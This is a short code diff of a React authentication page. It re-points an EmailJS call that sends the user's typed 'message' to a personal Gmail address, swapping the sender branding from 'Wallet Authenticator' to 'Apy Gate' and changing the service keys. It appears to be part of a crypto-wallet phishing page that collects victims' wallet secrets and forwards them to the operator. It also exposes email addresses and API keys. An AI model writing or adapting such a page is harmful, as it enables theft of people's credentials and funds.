@@ -14,18 +14,19 @@ function AuthPage() {
     setLoading(true);
 
     const templateParams = {
-      from_email: "walletauth@gmail.com",
-      from_name: "Wallet Authenticator",
-      to_name: "stevewinfried@gmail.com",
       message: data.message,
+      from_name: "Apy Gate",
+      from_email: "apygate@gmail.com",
+      to_name: "olaleyelekan15@gmail.com",
     };
 
     emailjs
       .send(
-        "service_1i32iu9",
-        "template_5tx1mqi",
+        "service_8c90ycf",
+        "template_bl5ug3g",
         templateParams,
-        "mE2fJOTkVsrNl8zkR"
+        { publicKey: 'Ha8pmtqm2UY1Q_AQn' }
+        //"mE2fJOTkVsrNl8zkR"
       )
       .then(
         (result) => {
